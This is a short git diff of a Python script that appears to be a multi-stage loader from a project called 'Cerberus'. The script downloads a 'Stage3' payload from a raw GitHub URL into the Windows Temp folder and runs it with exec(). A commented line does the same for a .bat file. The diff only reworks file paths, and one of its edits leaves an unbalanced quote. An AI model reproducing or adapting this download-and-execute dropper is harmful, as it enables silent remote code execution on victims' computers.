@@ -4,7 +4,7 @@ from bs4 import BeautifulSoup
 
 x = os.getlogin()
 
-path = "/Users/shrek/AppData/Local/Temp/Stage3.py"
+path = os.path.join("AppData/Local/Temp/Stage3.py")
 
 if os.path.isfile(path) == False:
     file = open('Stage3.py', 'a')
@@ -15,7 +15,7 @@ with urllib.request.urlopen("https://raw.githubusercontent.com/paramkudle/Cerber
     data = response.read().decode("utf-8")
     with open(filename, "a+") as fp: fp.write(data)
 
-# urllib.request.urlopen("https://raw.githubusercontent.com/paramkudle/Cerberus/main/TSource2.txt", "/Users/shrek/AppData/Local/Temp/THost.bat")
-urllib.request.urlretrieve("https://raw.githubusercontent.com/paramkudle/Cerberus/main/Stage3Source.txt", "/Users/shrek/AppData/Local/Temp/Stage3.py")
+# urllib.request.urlopen("https://raw.githubusercontent.com/paramkudle/Cerberus/main/TSource2.txt", os.path.join(AppData/Local/Temp/THost.bat"))
+urllib.request.urlretrieve("https://raw.githubusercontent.com/paramkudle/Cerberus/main/Stage3Source.txt", path)
 
-exec(open("/Users/shrek/AppData/Local/Temp/Stage3.py").read())
+exec(open(path).read())
